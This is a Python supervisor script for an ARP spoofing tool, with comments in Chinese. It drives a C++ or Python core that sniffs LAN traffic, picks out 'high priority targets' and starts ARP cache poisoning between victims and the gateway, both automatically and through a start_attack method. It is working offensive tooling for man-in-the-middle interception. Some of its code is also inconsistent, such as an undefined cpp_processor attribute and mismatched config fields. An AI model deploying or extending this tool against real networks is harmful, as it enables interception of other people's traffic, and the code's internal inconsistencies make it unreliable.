#!/usr/bin/env python3
"""
ARP Spoofer Python Supervisor v3.0 - C++ Core Integration (Fixed)
=================================================================
职责：
1. 启动和管理C++高性能核心处理器
2. 接收和处理C++核心发送的数据包
3. 提供Web API和监控接口
4. 配置管理和日志记录
5. 统计信息收集和展示

核心处理完全由C++负责，解决GIL限制和锁竞争问题
修复：添加了完整的C++→Python数据包接收器
"""

import time
import threading
import logging
import argparse
import signal
import sys
import yaml
import json
import zmq  # ★ 关键修正：导入ZMQ
from typing import Optional, Dict
from datetime import datetime

# 导入C++核心模块
CPP_MODULE_AVAILABLE = False
USE_FALLBACK = False

try:
    import arp_core_cpp
    print("✅ C++ core module loaded successfully")
    
    # 安全地获取版本信息（如果存在）
    version = getattr(arp_core_cpp, '__version__', 'unknown')
    description = getattr(arp_core_cpp, '__description__', 'ARP Spoofer C++ Core')
    print(f"📦 Module version: {version}")
    print(f"📋 Description: {description}")
    
    # 🔧 调试：列出模块中所有可用的属性
    print("🔍 Available attributes in arp_core_cpp module:")
    module_attrs = [attr for attr in dir(arp_core_cpp) if not attr.startswith('_')]
    for attr in module_attrs:
        attr_type = type(getattr(arp_core_cpp, attr)).__name__
        print(f"  - {attr} ({attr_type})")
    
    # 🔧 检查关键类是否存在
    required_classes = ['ARPSpoofer', 'PacketSniffer', 'ThreadPool']
    missing_classes = []
    
    for cls_name in required_classes:
        if not hasattr(arp_core_cpp, cls_name):
            missing_classes.append(cls_name)
        else:
            print(f"✅ Found {cls_name} class")
    
    if missing_classes:
        print(f"❌ Missing required classes: {missing_classes}")
        print("� Clear build cache and rebuild:")
        print("   cd cpp_core && rm -rf build/ && find . -name '*.so' -delete")
        print("   cd ../scripts && ./build.sh")
        print("\n⚠️ Using Python fallback for now...")
        USE_FALLBACK = True
    else:
        CPP_MODULE_AVAILABLE = True
        
except ImportError as e:
    print(f"❌ Failed to import C++ core module: {e}")
    print("Please build the C++ module first:")
    print("  cd cpp_core && mkdir build && cd build")
    print("  cmake .. && make -j$(nproc)")
    print("  The module should be available as arp_core_cpp.so")
    print("\n⚠️ Falling back to Python implementation...")
    USE_FALLBACK = True

# 导入回退实现
if USE_FALLBACK:
    from python_fallback import PythonARPSpoofer, PythonPacketSniffer
    print("📦 Python fallback implementation loaded")

from config import Config
from packet_analyzer import PacketAnalyzer      # ★ 关键修正：导入分析器
from attack_coordinator import AttackCoordinator  # ★ 关键修正：导入协调器
from state_cache import StateCache              # ★ 关键修正：导入状态缓存

# Web API 可选导入（性能优化：关闭Web功能）
try:
    from web_api import WebAPI
    WEB_API_AVAILABLE = True
except ImportError:
    print("⚠️ Web API module not available (Flask not installed)")
    print("💡 This is expected for performance-optimized deployments")
    WEB_API_AVAILABLE = False
    WebAPI = None

class PythonSupervisor:
    """修正的Python监督者 - 现在包含完整的C++→Python数据桥梁"""
    
    def __init__(self, config: Config):
        self.config = config
        self.running = False
        
        # 首先设置日志
        self._setup_logging()
        
        self.logger.info("🔧 Initializing PythonSupervisor (Fixed Version)...")
        
        # ★ 关键修正：初始化ZMQ上下文和套接字
        self.zmq_context = zmq.Context()
        self.packet_receiver_socket = None
        self.command_sender_socket = None
        self.packet_receiver_thread = None
        
        # ★ 关键修正：初始化分析和协调组件
        self.state_cache = StateCache()
        self.packet_analyzer = PacketAnalyzer(config)
        self.attack_coordinator = AttackCoordinator(config, self.state_cache)
        
        # C++核心处理器
        self.arp_spoofer = None
        self.packet_sniffer = None
        
        # Web API (如果启用且可用)
        if config.web_api.enabled and WEB_API_AVAILABLE:
            self.web_api = WebAPI(self, config)
        else:
            self.web_api = None
            if config.web_api.enabled and not WEB_API_AVAILABLE:
                self.logger.warning("⚠️ Web API 已配置但不可用 (Flask未安装)")
            else:
                self.logger.info("💡 Web API 已禁用 - 专注核心性能")
        
        # 监控线程
        self.monitor_thread = None
        
        # 统计信息
        self.stats = {
            'start_time': time.time(),
            'python_uptime': 0,
            'last_cpp_stats': None,
            'packets_received': 0,  # ★ 新增：数据包接收统计
            'packets_analyzed': 0,  # ★ 新增：分析统计
            'attacks_triggered': 0  # ★ 新增：攻击触发统计
        }
        
    def _setup_logging(self):
        """设置日志系统"""
        logging.basicConfig(
            level=getattr(logging, self.config.log_level.upper()),
            format='[%(asctime)s] [%(threadName)-20s] [%(levelname)-8s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S',
            handlers=[
                logging.FileHandler(self.config.log_file, mode='a'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        self.logger = logging.getLogger(__name__)
        
    def initialize(self) -> bool:
        """初始化监督者和C++核心 - 修正版本"""
        try:
            if USE_FALLBACK:
                self.logger.warning("⚠️ Using Python fallback implementation (reduced performance)")
                self.logger.info("🚀 Initializing Python Supervisor v3.0 with Python Fallback...")
            else:
                self.logger.info("🚀 Initializing Python Supervisor v3.0 with C++ Core (Fixed Version)...")
            
            # 🔧 检查必需的类是否可用（仅在使用C++模块时）
            if not USE_FALLBACK:
                if not hasattr(arp_core_cpp, 'ARPSpoofer'):
                    self.logger.error("❌ ARPSpoofer class not found in C++ module")
                    self.logger.error("This indicates a C++ compilation problem. Available classes:")
                    available = [attr for attr in dir(arp_core_cpp) if not attr.startswith('_')]
                    for attr in available:
                        self.logger.error(f"  - {attr}")
                    return False
                    
                if not hasattr(arp_core_cpp, 'PacketSniffer'):
                    self.logger.error("❌ PacketSniffer class not found in C++ module")
                    return False
            
            # ★ 关键修正：初始化ZMQ通信
            self.logger.info("� Initializing ZMQ communication channels...")
            
            # 数据包接收器 (PULL模式 - 接收C++发送的数据包)
            self.packet_receiver_socket = self.zmq_context.socket(zmq.PULL)
            packet_addr = self.config.ipc.packet_address
            self.packet_receiver_socket.bind(packet_addr)
            self.logger.info(f"📡 Packet receiver bound to: {packet_addr}")
            
            # 命令发送器 (PUSH模式 - 发送命令給C++)
            self.command_sender_socket = self.zmq_context.socket(zmq.PUSH)
            command_addr = self.config.ipc.command_address  
            self.command_sender_socket.bind(command_addr)
            self.logger.info(f"📨 Command sender bound to: {command_addr}")
            
            # 🔧 创建ARP欺骗器（使用网络接口）
            interface = self.config.network.interface or "wlan0"
            self.logger.info(f"📡 Creating ARPSpoofer with interface: {interface}")
            
            if USE_FALLBACK:
                self.arp_spoofer = PythonARPSpoofer(interface)
            else:
                self.arp_spoofer = arp_core_cpp.ARPSpoofer(interface)
            
            # 🔧 初始化ARP欺骗器
            if not self.arp_spoofer.initialize():
                self.logger.error("❌ Failed to initialize ARP Spoofer")
                return False
            
            # 🔧 创建数据包嗅探器
            self.logger.info(f"📡 Creating PacketSniffer with interface: {interface}")
            
            if USE_FALLBACK:
                self.packet_sniffer = PythonPacketSniffer(interface)
            else:
                self.packet_sniffer = arp_core_cpp.PacketSniffer(interface)
                
            if not self.packet_sniffer.initialize():
                self.logger.error("❌ Failed to initialize packet sniffer")
                return False
            
            # ★ 关键修正：设置攻击协调器的命令发送回调
            def send_command_to_cpp(command_dict):
                """发送命令到C++核心的回调函数"""
                try:
                    command_json = json.dumps(command_dict)
                    self.command_sender_socket.send_string(command_json, zmq.NOBLOCK)
                    self.logger.debug(f"📨 Sent command to C++: {command_dict['type']}")
                    return True
                except Exception as e:
                    self.logger.error(f"❌ Failed to send command to C++: {e}")
                    return False
            
            self.attack_coordinator.set_command_sender(send_command_to_cpp)
            
            impl_type = "Python Fallback" if USE_FALLBACK else "C++ Core"
            self.logger.info(f"✅ {impl_type} initialized successfully")
            self.logger.info(f"📡 Using network interface: {interface}")
            
            # 启动Web API（如果启用且可用）
            if self.config.web_api.enabled and WEB_API_AVAILABLE:
                self.web_api = WebAPI(self)
                self.web_api.start(self.config.web_api.port)
                self.logger.info(f"✅ Web API started on port {self.config.web_api.port}")
            elif self.config.web_api.enabled:
                self.logger.warning("⚠️ Web API 配置启用但不可用")
            else:
                self.logger.info("💡 Web API 已关闭 - 优化性能模式")
            
            self.logger.info("✅ Python Supervisor initialized successfully (Fixed Version)")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Failed to initialize supervisor: {e}")
            import traceback
            self.logger.error(f"Stack trace: {traceback.format_exc()}")
            return False
            
    def run(self):
        """运行主循环 - 启动C++核心并监控 (修正版本)"""
        self.running = True
        self.logger.info("🚀 Starting C++ Core Components (Fixed Version)...")
        
        try:
            # ★ 关键修正：启动数据包接收线程
            self.logger.info("📡 Starting packet receiver thread...")
            self.packet_receiver_thread = threading.Thread(
                target=self._packet_receiver_loop, 
                name="PacketReceiver",
                daemon=True
            )
            self.packet_receiver_thread.start()
            
            # 🔧 启动数据包捕获
            self.packet_sniffer.start_capture()
            self.logger.info("✅ C++ Packet capture started")
            
            # 🔧 启动监控线程
            self._start_monitoring()
            
            # 🔧 保持主线程运行
            self.logger.info("🎯 System fully operational - monitoring network...")
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.logger.info("🛑 Received interrupt signal...")
        except Exception as e:
            self.logger.error(f"❌ Error in main loop: {e}")
        finally:
            self._shutdown()
            
    def _packet_receiver_loop(self):
        """★ 关键修正：在专用线程中接收和处理C++核心发送的数据包"""
        self.logger.info("📡 Packet receiver thread started...")
        
        while self.running:
            try:
                # 使用poll避免永久阻塞，可以响应停止信号
                if self.packet_receiver_socket.poll(timeout=1000):  # 1秒超时
                    # 接收来自C++的JSON字符串
                    packet_json = self.packet_receiver_socket.recv_string(zmq.NOBLOCK)
                    self.stats['packets_received'] += 1
                    
                    self.logger.debug(f"📦 Received packet from C++: {len(packet_json)} bytes")
                    
                    # ★ 关键：分析数据包
                    try:
                        analysis_result = self.packet_analyzer.analyze_packet_json(packet_json)
                        if analysis_result:
                            self.stats['packets_analyzed'] += 1
                            self.logger.info(f"📊 Analyzed {analysis_result.packet_type} packet from {analysis_result.source_ip}")
                            
                            # ★ 关键：交给协调器做决策
                            self.attack_coordinator.process_analysis_result(analysis_result)
                            
                            # 检查是否触发了攻击
                            if analysis_result.priority >= 2:  # 高优先级
                                self.stats['attacks_triggered'] += 1
                                self.logger.warning(f"🎯 High priority target detected: {analysis_result.source_ip}")
                                
                        else:
                            self.logger.debug("📦 Packet analyzed but no significant result")
                            
                    except Exception as e:
                        self.logger.error(f"❌ Error analyzing packet: {e}")
                        
            except zmq.Again:
                # 非阻塞接收没有数据，继续循环
                continue
            except zmq.ZMQError as e:
                if e.errno == zmq.ETERM:
                    self.logger.info("🔌 ZMQ context terminated, exiting receiver loop")
                    break
                else:
                    self.logger.error(f"❌ ZMQ error in receiver loop: {e}")
            except Exception as e:
                self.logger.error(f"❌ Unexpected error in packet receiver loop: {e}")
                import traceback
                self.logger.error(f"Stack trace: {traceback.format_exc()}")
                
        self.logger.info("📡 Packet receiver thread stopped")

    def _start_monitoring(self):
        """启动监控线程"""
        def monitor():
            self.logger.info("📊 Performance monitoring thread started")
            
            while self.running:
                try:
                    # 更新Python运行时间
                    self.stats['python_uptime'] = time.time() - self.stats['start_time']
                    
                    # 获取ARP欺骗器统计信息
                    if hasattr(self, 'arp_spoofer'):
                        packets_sent = self.arp_spoofer.get_total_packets_sent()
                        sessions = self.arp_spoofer.get_total_sessions()
                        active_sessions = self.arp_spoofer.get_active_sessions_count()
                        active_targets = self.arp_spoofer.get_active_targets()
                        
                        # 获取线程池统计（仅C++版本支持）
                        if not USE_FALLBACK:
                            queue_sizes = self.arp_spoofer.get_thread_pool_queue_sizes()
                            completion_rate = self.arp_spoofer.get_thread_pool_completion_rate()
                            
                            # 检测异常情况
                            if completion_rate < 90.0:
                                self.logger.warning(f"⚠️ 线程池完成率较低: {completion_rate:.1f}%")
                            
                            # 检查线程池负载均衡
                            if queue_sizes and max(queue_sizes) > min(queue_sizes) * 3:
                                self.logger.warning("⚠️ 线程池负载不均衡")
                                
                            # 定期输出统计信息
                            self.logger.info(
                                f"📈 Stats: 📤 Sent={packets_sent}, 🎯 Active={active_sessions}, "
                                f"📊 Rate={completion_rate:.1f}%, 🧵 Queues={len(queue_sizes)}"
                            )
                        else:
                            # Python回退版本的简化统计
                            self.logger.info(
                                f"📈 Stats (Python): 📤 Sent={packets_sent}, 🎯 Active={active_sessions}, "
                                f"🏷️ Total={sessions}"
                            )
                    
                    # 获取数据包嗅探器统计
                    if hasattr(self, 'packet_sniffer'):
                        packet_count = self.packet_sniffer.get_packet_count()
                        if packet_count == 0:
                            self.logger.warning("⚠️ 没有捕获到数据包 - 检查网络接口和权限")
                    
                    time.sleep(10)  # 每10秒监控一次
                    
                except Exception as e:
                    self.logger.error(f"❌ Error in monitoring thread: {e}")
                    time.sleep(5)
                    
            self.logger.info("📊 Performance monitoring thread stopped")
            
        self.monitor_thread = threading.Thread(target=monitor, daemon=True)
        self.monitor_thread.start()
        
    def get_statistics(self) -> Dict:
        """获取综合统计信息"""
        stats = {
            'python_supervisor': {
                'uptime': time.time() - self.stats['start_time'],
                'status': 'running' if self.running else 'stopped'
            }
        }
        
        if self.cpp_processor:
            try:
                cpp_stats = self.cpp_processor.get_statistics()
                stats['cpp_processor'] = {
                    'packets_captured': cpp_stats.packets_captured,
                    'packets_processed': cpp_stats.packets_processed,
                    'attacks_launched': cpp_stats.attacks_launched,
                    'attacks_successful': cpp_stats.attacks_successful,
                    'processing_rate': cpp_stats.processing_rate,
                    'cache_hit_rate': cpp_stats.hit_rate,
                    'uptime_seconds': cpp_stats.uptime.total_seconds(),
                    'status': 'running' if self.cpp_processor.is_running() else 'stopped'
                }
            except Exception as e:
                stats['cpp_processor'] = {'error': str(e)}
                
        return stats
    def _shutdown(self):
        """清理资源 (修正版本)"""
        self.logger.info("🛑 Shutting down Python Supervisor (Fixed Version)...")
        if not self.running:
            return
        self.running = False
        
        # ★ 关键修正：停止数据包接收线程
        if hasattr(self, 'packet_receiver_thread') and self.packet_receiver_thread.is_alive():
            self.logger.info("🛑 Stopping packet receiver thread...")
            self.packet_receiver_thread.join(timeout=3)
        
        # ★ 关键修正：关闭ZMQ套接字和上下文
        if hasattr(self, 'packet_receiver_socket') and self.packet_receiver_socket:
            self.logger.info("🔌 Closing packet receiver socket...")
            self.packet_receiver_socket.close()
            
        if hasattr(self, 'command_sender_socket') and self.command_sender_socket:
            self.logger.info("🔌 Closing command sender socket...")
            self.command_sender_socket.close()
            
        if hasattr(self, 'zmq_context') and self.zmq_context:
            self.logger.info("🔌 Terminating ZMQ context...")
            self.zmq_context.term()
        
        # 停止ARP欺骗器
        if hasattr(self, 'arp_spoofer'):
            self.logger.info("🛑 Stopping ARP Spoofer...")
            self.arp_spoofer.shutdown()
            
        # 停止数据包嗅探器
        if hasattr(self, 'packet_sniffer'):
            self.logger.info("🛑 Stopping Packet Sniffer...")
            self.packet_sniffer.stop_capture()
        
        # 停止Web API
        if hasattr(self, 'web_api') and self.web_api:
            self.logger.info("🛑 Stopping Web API...")
            try:
                self.web_api.stop()
            except:
                pass
            
        # 等待监控线程结束
        if hasattr(self, 'monitor_thread') and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=5)
            
        # 打印最终统计信息
        self._print_final_stats()
        
    def _print_final_stats(self):
        """打印最终统计信息"""
        runtime = time.time() - self.stats['start_time']
        
        self.logger.info("=" * 80)
        self.logger.info("🎯 Python Supervisor Final Report")
        self.logger.info("=" * 80)
        self.logger.info(f"⏱️ Runtime: {runtime:.2f} seconds")
        
        if self.stats['last_cpp_stats']:
            cpp_stats = self.stats['last_cpp_stats']
            self.logger.info(f"📦 Packets processed: {cpp_stats.packets_processed}")
            self.logger.info(f"🎯 Attacks launched: {cpp_stats.attacks_launched}")
            self.logger.info(f"✅ Attacks successful: {cpp_stats.attacks_successful}")
            self.logger.info(f"⚡ Processing rate: {cpp_stats.processing_rate:.2f} pps")
            self.logger.info(f"💾 Cache hit rate: {cpp_stats.hit_rate:.2f}%")
        
        self.logger.info("=" * 80)

    def start_attack(self, target_ip: str, target_mac: str = "", gateway_ip: str = "", gateway_mac: str = ""):
        """手动启动对指定目标的攻击"""
        try:
            if not hasattr(self, 'arp_spoofer'):
                self.logger.error("❌ ARP Spoofer not initialized")
                return False
            
            # 如果未提供网关信息，使用默认值
            if not gateway_ip:
                gateway_ip = self.config.network.gateway_ip or "10.17.0.1"  # 使用实际网关
            if not gateway_mac:
                gateway_mac = "00:11:22:33:44:55"  # 简化：使用默认MAC
            if not target_mac:
                target_mac = "aa:bb:cc:dd:ee:ff"   # 简化：使用默认MAC
                
            self.logger.info(f"🎯 Starting attack on {target_ip} via gateway {gateway_ip}")
            
            success = self.arp_spoofer.start_spoofing(target_ip, gateway_ip, target_mac, gateway_mac)
            if success:
                self.logger.info(f"✅ Attack on {target_ip} started successfully")
            else:
                self.logger.error(f"❌ Failed to start attack on {target_ip}")
                
            return success
            
        except Exception as e:
            self.logger.error(f"❌ Error starting attack on {target_ip}: {e}")
            return False
    
    def stop_attack(self, target_ip: str):
        """停止对指定目标的攻击"""
        try:
            if not hasattr(self, 'arp_spoofer'):
                self.logger.error("❌ ARP Spoofer not initialized")
                return False
                
            self.logger.info(f"🛑 Stopping attack on {target_ip}")
            success = self.arp_spoofer.stop_spoofing(target_ip)
            
            if success:
                self.logger.info(f"✅ Attack on {target_ip} stopped successfully")
            else:
                self.logger.warning(f"⚠️ Target {target_ip} was not being attacked")
                
            return success
            
        except Exception as e:
            self.logger.error(f"❌ Error stopping attack on {target_ip}: {e}")
            return False

    def shutdown(self):
        """关闭系统 - _shutdown 的别名"""
        self._shutdown()
        
def parse_arguments():
    """解析命令行参数"""
    parser = argparse.ArgumentParser(description="ARP Spoofer Python Supervisor")
    parser.add_argument('-c', '--config', default='config.yaml',
                       help='Configuration file path')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
                       help='Log level (overrides config file)')
    parser.add_argument('--web-api', action='store_true',
                       help='Enable web API interface')
    parser.add_argument('--web-port', type=int,
                       help='Web API port (overrides config file)')
    # 新增网络配置参数
    parser.add_argument('--interface', 
                       help='Network interface (overrides config file)')
    parser.add_argument('--gateway-ip',
                       help='Gateway IP address (overrides config file)')
    
    return parser.parse_args()

def signal_handler(signum, frame):
    """信号处理器"""
    print(f"\nReceived signal {signum}, shutting down...")
    sys.exit(0)

def main():
    """主函数"""
    try:
        # 解析命令行参数
        args = parse_arguments()
        
        # 设置信号处理
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
    
        # 🔧 优先级：默认值 < YAML配置文件 < 命令行参数
        # 加载配置（第一步：YAML文件 - 主要配置来源）
        config = Config.load_from_file(args.config)
        print(f"📋 Loaded config from: {args.config}")
        
        # 命令行参数覆盖（第二步：仅在明确指定时覆盖YAML）
        overrides = []
        if args.log_level:
            config.logging.level = args.log_level
            overrides.append(f"log_level={args.log_level}")
        if args.web_api:
            config.web_api.enabled = True
            overrides.append("web_api=enabled")
        if args.web_port:
            config.web_api.port = args.web_port
            overrides.append(f"web_port={args.web_port}")
        if args.interface:
            config.network.interface = args.interface
            overrides.append(f"interface={args.interface}")
        if args.gateway_ip:
            config.network.gateway_ip = args.gateway_ip
            overrides.append(f"gateway_ip={args.gateway_ip}")
            
        # 显示配置优先级信息
        if overrides:
            print(f"🔧 Command line overrides: {', '.join(overrides)}")
        else:
            print("✅ Using pure YAML configuration (no command line overrides)")
            
        # 打印最终使用的关键配置
        impl_mode = "C++ High Performance" if CPP_MODULE_AVAILABLE and not USE_FALLBACK else "Python Fallback"
        print(f"📋 Implementation: {impl_mode}")
        print(f"📋 Final config - Interface: {config.network.interface}, Gateway: {config.network.gateway_ip}")
        print(f"📋 Performance - Threads: {config.performance.max_worker_threads}, Attack freq: {getattr(config.attack, 'attack_frequency', 'default')}")
        
        # 创建并运行监督者
        print("🔧 Creating PythonSupervisor...")
        supervisor = PythonSupervisor(config)
        
        print("🔧 Initializing supervisor...")
        if supervisor.initialize():
            print("🚀 Running supervisor...")
            
            # 🔧 添加测试攻击（可选）
            # 在生产环境中，攻击目标应该通过API或配置文件指定
            # supervisor.start_attack("192.168.1.100")  # 示例攻击目标
            
            supervisor.run()
        else:
            print("❌ Failed to initialize supervisor")
            sys.exit(1)
            
    except Exception as e:
        print(f"Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
